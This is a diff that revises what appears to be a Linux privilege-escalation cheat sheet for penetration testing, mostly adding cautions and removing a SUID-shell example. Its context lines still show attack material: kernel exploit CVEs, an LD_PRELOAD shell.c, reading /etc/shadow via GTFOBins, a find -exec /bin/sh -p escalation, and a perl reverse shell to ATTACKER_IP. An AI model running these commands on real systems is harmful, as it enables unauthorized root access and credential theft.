@@ -125,8 +125,8 @@ ps aux | grep root
 #### Environment Variables
 
 ```bash
-# Full environment
-env
+# Environment may contain live secrets; inspect only task-relevant variable names
+# Do not dump full environment into evidence logs.
 
 # PATH variable (for hijacking)
 echo $PATH
@@ -190,7 +190,7 @@ searchsploit linux kernel [version]
 |---------------|---------|-----|
 | 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
 | 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
-| 5.8+ | Dirty Pipe | CVE-2022-0847 |
+| Selected unpatched 5.8+ branches; fixed releases/backports excluded | Dirty Pipe | CVE-2022-0847 |
 
 #### Compile and Execute
 
@@ -241,6 +241,7 @@ When env_keep includes LD_PRELOAD:
 // shell.c
 #include <stdio.h>
 #include <sys/types.h>
+#include <unistd.h>
 #include <stdlib.h>
 
 void _init() {
@@ -276,10 +277,8 @@ Reference GTFOBins for SUID exploitation:
 LFILE=/etc/shadow
 base64 "$LFILE" | base64 -d
 
-# Example: cp for file writing
-cp /bin/bash /tmp/bash
-chmod +s /tmp/bash
-/tmp/bash -p
+# A normal unprivileged cp/chmod does not produce a root-owned SUID shell.
+# Validate the exact privileged file-write primitive and mount/ownership semantics in a lab.
 
 # Example: find with SUID
 find . -exec /bin/sh -p \; -quit
@@ -434,3 +433,5 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 | Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
 | SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
 | Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |
+
+Kernel version ranges above are rough historical leads, not vulnerability detection: check vendor backports, architecture, configuration and advisory applicability. SUID/capability behavior depends on ownership, mount options, interpreters and privilege dropping; strings output alone is not proof of a callable vulnerable path. Persistent account/cron/SUID changes require explicit authorization, original-state backup and verified cleanup. Pin and review enumeration/exploit artifacts before execution rather than trusting moving latest URLs. Use private evidence storage; never report full shadow hashes or environment secrets. Root shell is an optional authorized proof, not a mandatory deliverable when safe minimal evidence suffices.
